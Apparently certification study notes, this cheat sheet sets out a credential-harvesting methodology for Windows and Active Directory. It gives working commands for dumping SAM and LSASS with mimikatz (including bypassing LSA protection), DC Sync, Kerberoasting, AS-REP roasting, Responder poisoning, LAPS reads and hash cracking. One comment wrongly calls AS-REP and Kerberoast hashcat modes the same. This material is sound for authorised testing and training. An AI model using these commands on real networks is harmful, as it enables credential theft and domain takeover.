# Credentials Harvesting Methodology

Covers: SAM, LSASS, Credential Manager, NTDS/DC Sync, LAPS, Kerberoasting, AS-REP Roasting.
Relevant PT1 sections: AD Exploitation, Post-Exploitation, Network Pentesting.

---

## Where Credentials Live (Quick Reference)

| Location | What You Get |
|---|---|
| SAM database | Local account NTLM hashes |
| LSASS memory | Clear-text passwords, NTLM hashes, Kerberos tickets |
| Windows Credential Manager | Cached web/Windows/generic passwords |
| NTDS.dit (DC) | All AD user hashes |
| SYSVOL / GPP XML | Legacy encrypted admin passwords (AES key published by MS) |
| LAPS attributes | Clear-text local admin password per machine |
| Registry | Passwords stored by apps/scripts (`reg query`) |
| PowerShell history | Commands with embedded creds |

---

## 1. Quick Wins — Search Before Dumping

```powershell
# PowerShell command history
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Registry keyword search (run as admin)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## 2. SAM Database (Local Hashes)

SAM is locked while Windows runs — use one of the methods below.

### Method A: Volume Shadow Copy

```cmd
# 1. Create shadow copy (admin cmd)
wmic shadowcopy call create Volume='C:\'

# 2. Find the shadow volume path
vssadmin list shadows

# 3. Copy SAM + SYSTEM from the shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\temp\system

# 4. Exfil to attack box, then:
secretsdump.py -sam sam -system system LOCAL
```

### Method B: Registry Hive Dump

```cmd
reg save HKLM\sam C:\temp\sam-reg
reg save HKLM\system C:\temp\system-reg

# On attack box:
secretsdump.py -sam sam-reg -system system-reg LOCAL
```

### Method C: Metasploit Hashdump

```
meterpreter> hashdump
```

Uses in-memory injection into LSASS — no file on disk.

---

## 3. LSASS Memory Dump (Clear-text Passwords + Hashes)

Requires local administrator. LSASS runs as SYSTEM.

### Dump the Process

**GUI:** Task Manager → Details → lsass.exe → Create dump file

**ProcDump (CLI):**
```cmd
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```

### Extract with Mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

If you get `ERROR 0x00000005` (Access Denied) → LSA Protection is enabled:

```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

> `!+` loads the `mimidrv.sys` kernel driver. If `isFileExist` error: exit mimikatz, cd to its folder, rerun.

### Parse Offline Dump

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 4. Windows Credential Manager

Stores: web credentials, Windows auth, generic creds, certificates.
Scope: per user, cached in memory.

### Enumerate

```cmd
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"

# Show stored Windows credentials
cmdkey /list
```

### Extract Web Credentials (PowerShell)

```powershell
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

### Extract with Mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

### RunAs with Saved Credentials

If `cmdkey /list` shows a stored credential, spawn a shell as that user without knowing the password:

```cmd
runas /savecred /user:DOMAIN\username cmd.exe
```

---

## 5. NTDS.dit — Domain Controller Hashes

NTDS.dit is locked on a live DC. Requires admin on the DC.
Also need: `SYSTEM` and `SECURITY` hive files to decrypt.

### Local Dump with Ntdsutil (no remote creds needed, on DC)

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
# Creates: C:\temp\Active Directory\ntds.dit
#          C:\temp\registry\SYSTEM + SECURITY
```

```bash
# On attack box:
secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
```

### Remote DC Sync (needs AD replication permissions)

Required permissions on the compromised account:
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

```bash
# Dump all hashes
secretsdump.py -just-dc THM.red/<admin_user>@<DC_IP>

# NTLM hashes only
secretsdump.py -just-dc-ntlm THM.red/<admin_user>@<DC_IP>
```

### Crack NTLM Hashes

```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 6. LAPS (Local Administrator Password Solution)

LAPS stores a rotating clear-text local admin password in AD attributes:
- `ms-mcs-AdmPwd` — the password
- `ms-mcs-AdmPwdExpirationTime` — expiry

### Enumerate

```cmd
# Check if LAPS is installed
dir "C:\Program Files\LAPS\CSE"

# List LAPS cmdlets
Get-Command *AdmPwd*

# Find which OUs/groups have read rights
Find-AdmPwdExtendedRights -Identity THMorg

# Check group members
net group "THMGroupReader"
```

### Read LAPS Password (must be member of the reader group)

```powershell
Get-AdmPwdPassword -ComputerName <target-machine>
```

Attack path: enumerate → find group with ExtendedRightHolder → compromise a member → read LAPS password.

---

## 7. Kerberoasting

Target: SPN accounts (IIS, MSSQL, service accounts).
Goal: get TGS ticket → crack offline → gain service account password.

```bash
# 1. Find SPN accounts
GetUserSPNs.py -dc-ip <DC_IP> THM.red/thm

# 2. Request TGS for target SPN
GetUserSPNs.py -dc-ip <DC_IP> THM.red/thm -request-user svc-user

# 3. Crack the ticket
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

---

## 8. AS-REP Roasting

Target: AD accounts with "Do not require Kerberos pre-authentication" set.
Goal: get AS-REP hash → crack offline.

```bash
# Spray a user list
GetNPUsers.py -dc-ip <DC_IP> thm.red/ -usersfile /tmp/users.txt

# Crack (same mode as Kerberoasting — it's also krb5asrep$23)
hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## 9. Network-Based Credential Capture

### LLMNR/NBT-NS Poisoning (Responder)

Intercepts name resolution broadcasts → captures NTLM hashes.

```bash
# Allow the port first
sudo ufw allow 445/tcp

# Run Responder (no sudo — wrapper handles it)
responder -I tun0 -wv
```

Captured hashes → crack with hashcat `-m 5600` (NTLMv2).

### SMB Relay

- Requires SMB signing disabled on target
- Use `ntlmrelayx.py` to relay captured auth to another host
- See `methodology_lateral_movement_and_pivoting.md`

---

## 10. GPP / SYSVOL (Legacy — Pre-2015)

Group Policy Preferences stored encrypted passwords in SYSVOL XML files.
AES-256 key was published by Microsoft → trivially decryptable.

```bash
# Auto-find and decrypt
Get-GPPPassword
```

Modern environments won't have this, but check anyway — old GPOs sometimes persist.

---

## Attack Decision Tree

```
Got initial access?
├── Local admin?
│   ├── Dump SAM (shadow copy or reg save + secretsdump.py)
│   ├── Dump LSASS (procdump → mimikatz or sekurlsa::logonpasswords)
│   └── Check Credential Manager (vaultcmd / cmdkey / sekurlsa::credman)
├── Domain user only?
│   ├── Kerberoast (GetUserSPNs.py)
│   ├── AS-REP Roast (GetNPUsers.py)
│   ├── Check user descriptions for passwords (BloodHound / LDAP enum)
│   └── LLMNR poisoning if on the network
└── Admin on DC?
    ├── Ntdsutil local dump → secretsdump.py
    ├── DC Sync (secretsdump.py -just-dc)
    └── LAPS read (Get-AdmPwdPassword if in reader group)
```

---

## Tools Summary

| Tool | Purpose |
|---|---|
| `secretsdump.py` | Decrypt SAM/NTDS locally or DC Sync remotely |
| `mimikatz` | LSASS dump, credential manager, pass-the-hash/ticket |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |
| `procdump.exe` | LSASS process dump |
| `vaultcmd` / `cmdkey` | Enumerate Credential Manager |
| `Get-WebCredentials.ps1` | Extract web vault passwords |
| `Get-AdmPwdPassword` | Read LAPS password |
| `Find-AdmPwdExtendedRights` | Find who can read LAPS |
| `responder` | LLMNR/NBT-NS poisoning |
| `hashcat` | Crack NTLM (`-m 1000`), TGS (`-m 13100`), AS-REP (`-m 18200`), NTLMv2 (`-m 5600`) |
| `Snaffler` / `Lazagne` / `Seatbelt` | Broad credential hunting on a host |
